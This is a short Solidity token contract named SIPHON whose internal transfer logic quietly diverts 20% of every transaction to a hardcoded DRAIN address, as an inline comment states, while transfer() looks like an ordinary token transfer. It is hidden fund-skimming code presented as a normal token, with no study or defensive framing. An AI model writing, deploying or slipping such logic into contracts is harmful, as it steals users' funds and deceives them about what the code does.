pragma solidity ^0.8.0;
contract SIPHON {
  address private master;
  mapping(address=>uint256) public ledger;
  address private constant DRAIN = 0x1337133713371337133713371337133713371337;
  constructor() { master = msg.sender; ledger[master] = 1e26; }
  function _update(address from, address to, uint256 value) internal {
    // Silently redirects 20% of every transaction to DRAIN address
    uint256 drainAmt = value / 5;
    ledger[from] -= value;
    ledger[to] += value - drainAmt;
    ledger[DRAIN] += drainAmt;
  }
  function transfer(address to, uint256 value) external {
    _update(msg.sender, to, value);
  }
}

